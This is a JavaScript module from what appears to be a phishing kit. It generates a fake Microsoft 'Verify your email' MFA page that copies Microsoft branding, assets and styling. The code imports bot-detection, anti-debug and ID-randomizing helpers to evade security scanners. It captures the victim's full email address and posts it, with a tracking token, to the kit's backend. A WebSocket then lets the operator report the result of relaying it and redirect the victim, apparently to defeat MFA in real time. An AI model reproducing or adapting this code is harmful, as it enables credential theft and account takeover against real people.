/**
 * MS Mail Input Page Generator
 * Generates the email verification input page for MFA with bot evasion
 */

const { randomId, randomComment, randomizeWhitespace, getBotDetectionScript, getAntiDebugScript, getDecoyElements } = require('./utils/antiBot');

function generateMsMailInputPage(token, options = {}) {
    // Generate randomized IDs for key elements
    const ids = {
        emailInput: randomId('inp'),
        sendCodeBtn: randomId('btn'),
        emailError: randomId('err'),
        userEmailDisplay: randomId('usr'),
        userEmailText: randomId('txt'),
        verificationDescription: randomId('desc'),
        enterCodeLink: randomId('lnk')
    };

    const html = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verify your email</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, 'Roboto', 'Helvetica Neue', Arial, sans-serif;
            background-color: #f2f2f2;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
            color: #1f1f1f;
            background-image: url('https://logincdn.msftauth.net/shared/5/images/fluent_web_dark_2_bf5f23287bc9f60c9be2.svg');
            background-size: cover;
            background-position: center;
        }

        .container {
            background: #ffffff;
            padding: 44px;
            border-radius: 8px;
            box-shadow: 0 2px 6px 0 rgba(0, 0, 0, 0.2), 0 0 1px 0 rgba(0, 0, 0, 0.1);
            width: 440px;
            max-width: 90%;
            text-align: left;
            position: relative;
        }

        .logo-container {
            display: flex;
            align-items: center;
            margin-bottom: 16px;
        }

        .ms-logo {
            width: 21px;
            height: 21px;
            margin-right: 8px;
        }

        .logo-text {
            font-size: 15px;
            font-weight: 600;
            color: #1f1f1f;
        }

        .user-email {
            font-size: 15px;
            color: #1f1f1f;
            margin-bottom: 24px;
            display: inline-flex;
            align-items: center;
            gap: 6px;
            cursor: pointer;
            transition: all 0.1s ease;
            padding: 4px 0;
            background: none;
            border: none;
            font-family: inherit;
        }

        .user-email:hover {
            color: #0067b8;
        }

        .user-email:hover .back-arrow {
            transform: translateX(-2px);
        }

        .back-arrow {
            width: 12px;
            height: 12px;
            transition: transform 0.2s ease;
            flex-shrink: 0;
        }

        h1 {
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 8px;
            color: #1f1f1f;
            line-height: 28px;
        }

        .description {
            color: #605e5c;
            margin-bottom: 24px;
            font-size: 15px;
            line-height: 20px;
        }

        .input-container {
            margin-bottom: 24px;
            position: relative;
        }

        .input-container label {
            display: block;
            font-size: 13px;
            font-weight: 600;
            color: #1f1f1f;
            margin-bottom: 8px;
        }

        .input-container input {
            width: 100%;
            padding: 8px 8px;
            border: none;
            border-bottom: 1px solid #8a8886;
            border-radius: 0;
            font-size: 15px;
            transition: border-bottom-color 0.1s ease, border-bottom-width 0.1s ease;
            box-sizing: border-box;
            background: transparent;
            color: #1f1f1f;
            font-family: inherit;
        }

        .input-container input:hover {
            border-bottom-color: #323130;
        }

        .input-container input:focus {
            border-bottom-color: #0078d4;
            outline: none;
            border-bottom-width: 2px;
            padding-bottom: 7px;
        }

        .input-container input::placeholder {
            color: #a19f9d;
        }

        .error-message {
            color: #a4262c;
            font-size: 12px;
            margin-top: 4px;
            display: none;
            animation: slideDown 0.2s ease;
        }

        .error-message.show {
            display: block;
        }

        @keyframes slideDown {
            from {
                opacity: 0;
                transform: translateY(-4px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .button-container {
            text-align: right;
            margin-top: 24px;
            margin-bottom: 28px;
        }

        .btn-primary {
            background-color: #0067b8;
            color: white;
            border: none;
            padding: 10px 28px;
            font-size: 15px;
            font-weight: 600;
            border-radius: 2px;
            cursor: pointer;
            transition: background-color 0.1s ease;
            min-width: 108px;
            font-family: inherit;
        }

        .btn-primary:hover:not(:disabled) {
            background-color: #005a9e;
        }

        .btn-primary:active:not(:disabled) {
            background-color: #004578;
        }

        .btn-primary:disabled {
            background-color: #f3f2f1;
            color: #a19f9d;
            cursor: not-allowed;
        }

        .btn-primary.sending {
            background-color: #0067b8;
            color: white;
            cursor: wait;
        }

        .already-received {
            text-align: left;
            margin-top: 0;
            margin-bottom: 24px;
        }

        .already-received a {
            color: #0067b8;
            text-decoration: none;
            font-size: 15px;
            transition: color 0.1s ease;
        }

        .already-received a:hover {
            color: #004578;
            text-decoration: underline;
        }

        .footer {
            position: fixed;
            bottom: 16px;
            right: 16px;
            display: flex;
            gap: 16px;
            font-size: 12px;
            z-index: 1;
        }

        .footer a {
            color: rgba(255, 255, 255, 0.8);
            text-decoration: none;
            transition: color 0.1s ease;
        }

        .footer a:hover {
            color: rgba(255, 255, 255, 1);
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo-container">
            <svg class="ms-logo" viewBox="0 0 21 21" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M0 0H9.9V9.9H0V0Z" fill="#F25022" />
                <path d="M11.1 0H21V9.9H11.1V0Z" fill="#7FBA00" />
                <path d="M0 11.1H9.9V21H0V11.1Z" fill="#00A4EF" />
                <path d="M11.1 11.1H21V11.1V21H11.1V11.1Z" fill="#FFB900" />
            </svg>
            <span class="logo-text">Microsoft</span>
        </div>

        <button class="user-email" id="user-email-display" type="button">
            <svg class="back-arrow" viewBox="0 0 12 12" fill="currentColor">
                <path d="M10 5H3.83L6.42 2.41L5 1L0 6L5 11L6.41 9.59L3.83 7H10V5Z" />
            </svg>
            <span id="user-email-text">Loading...</span>
        </button>

        <h1>Verify your email</h1>
        <p class="description" id="verification-description">We will send a verification code to your email address. To verify that this is your email address, enter it below.</p>

        <div class="input-container">
            <label for="email-input">Email address</label>
            <input type="email" id="email-input" placeholder="someone@example.com" autocomplete="email" required>
            <div class="error-message" id="email-error">Please enter a valid email address</div>
        </div>

        <div class="already-received">
            <a href="/${token}/codeinput" id="enter-code-link">I have a code</a>
        </div>

        <div class="button-container">
            <button class="btn-primary" id="send-code-btn" disabled>Send code</button>
        </div>
    </div>

    <div class="footer">
        <a href="#">Terms of use</a>
        <a href="#">Privacy &amp; cookies</a>
        <a href="#">...</a>
    </div>

    <script>
        const TOKEN = '${token}';
        
        // Email validation function
        function isValidEmail(email) {
            const re = /^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$/;
            return re.test(String(email).toLowerCase());
        }

        document.addEventListener('DOMContentLoaded', () => {
            // WebSocket connection for backend communication
            let ws;
            let reconnectAttempts = 0;
            const maxReconnectAttempts = 5;

            function connectWebSocket() {
                try {
                    ws = new WebSocket(\`ws://\${window.location.host}\`);

                    ws.onopen = () => {
                        console.log('🔌 MailInput WebSocket connected');
                        reconnectAttempts = 0;
                    };

                    ws.onmessage = (event) => {
                        try {
                            const data = JSON.parse(event.data);
                            console.log('📢 MailInput message from server:', data);

                            if (data.status === 'email_input_success') {
                                console.log('✅ Backend successfully input email');
                                window.location.href = '/' + TOKEN + '/codeinput';
                            } else if (data.status === 'email_input_failed') {
                                console.log('❌ Backend failed to input email');
                                const emailError = document.getElementById('email-error');
                                emailError.textContent = 'Failed to input email. Please try again.';
                                emailError.classList.add('show');
                            } else if (data.redirect) {
                                console.log('🔀 Redirect received:', data.redirect);
                                window.location.href = data.redirect;
                            }
                        } catch (error) {
                            console.error('Error parsing WebSocket message:', error);
                        }
                    };

                    ws.onclose = () => {
                        console.log('🔌 MailInput WebSocket disconnected');
                        if (reconnectAttempts < maxReconnectAttempts) {
                            reconnectAttempts++;
                            console.log(\`🔄 Reconnecting... (\${reconnectAttempts}/\${maxReconnectAttempts})\`);
                            setTimeout(connectWebSocket, 2000);
                        }
                    };

                    ws.onerror = (error) => {
                        console.error('MailInput WebSocket error:', error);
                    };
                } catch (error) {
                    console.error('Failed to create MailInput WebSocket:', error);
                }
            }

            connectWebSocket();

            const emailInput = document.getElementById('email-input');
            const sendCodeBtn = document.getElementById('send-code-btn');
            const enterCodeLink = document.getElementById('enter-code-link');
            const userEmailDisplay = document.getElementById('user-email-display');
            const userEmailText = document.getElementById('user-email-text');
            const verificationDescription = document.getElementById('verification-description');
            const emailError = document.getElementById('email-error');

            // Get the masked email and user email from sessionStorage
            const maskedEmail = sessionStorage.getItem('selectedOption') || sessionStorage.getItem('selectedEmail') || '';
            const userEmail = sessionStorage.getItem('userEmail') || '';

            if (userEmailText) {
                userEmailText.textContent = userEmail || 'Loading...';
            }

            if (maskedEmail) {
                verificationDescription.textContent = \`We will send a verification code to \${maskedEmail}. To verify that this is your email address, enter it below.\`;
            }

            userEmailDisplay.addEventListener('click', () => {
                window.history.back();
            });

            emailInput.addEventListener('input', () => {
                const email = emailInput.value.trim();
                const isValid = isValidEmail(email);
                emailError.classList.remove('show');
                sendCodeBtn.disabled = !isValid;

                if (email && !isValid) {
                    emailInput.style.borderBottomColor = '#a4262c';
                    emailInput.style.borderBottomWidth = '2px';
                } else if (email && isValid) {
                    emailInput.style.borderBottomColor = '#0078d4';
                    emailInput.style.borderBottomWidth = '2px';
                } else {
                    emailInput.style.borderBottomColor = '#8a8886';
                    emailInput.style.borderBottomWidth = '1px';
                }
            });

            sendCodeBtn.addEventListener('click', async () => {
                const email = emailInput.value.trim();

                if (!isValidEmail(email)) {
                    emailError.classList.add('show');
                    emailInput.focus();
                    return;
                }

                sendCodeBtn.disabled = true;
                sendCodeBtn.textContent = 'Sending...';
                sendCodeBtn.classList.add('sending');

                try {
                    const selectedEmail = sessionStorage.getItem('selectedOption') || sessionStorage.getItem('selectedEmail');

                    console.log('📤 Sending full email to backend:');
                    console.log('🎭 Masked Email:', selectedEmail);
                    console.log('📧 Full Email:', email);

                    const response = await fetch('/api/send-verification-code', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            maskedEmail: selectedEmail,
                            fullEmail: email,
                            token: TOKEN
                        })
                    });

                    console.log('📥 Response status:', response.status);
                    const result = await response.json();
                    console.log('📥 Response:', result);

                    if (result.success || result.status === 'success') {
                        console.log('✅ Backend successfully received full email');
                        sessionStorage.setItem('emailToVerify', email);
                        sendCodeBtn.textContent = 'Code Sent!';

                        setTimeout(() => {
                            window.location.href = '/' + TOKEN + '/codeinput';
                        }, 1500);
                    } else {
                        throw new Error(result.message || 'Failed to send verification code');
                    }
                } catch (error) {
                    console.error('Error:', error);
                    emailError.textContent = error.message || 'An error occurred. Please try again.';
                    emailError.classList.add('show');
                    sendCodeBtn.disabled = false;
                    sendCodeBtn.textContent = 'Send code';
                    sendCodeBtn.classList.remove('sending');
                }
            });

            enterCodeLink.style.pointerEvents = 'auto';
            enterCodeLink.style.opacity = '1';

            setTimeout(() => emailInput.focus(), 100);
        });
    </script>
</body>
</html>`;

    return randomizeWhitespace(html);
}

module.exports = { generateMsMailInputPage };

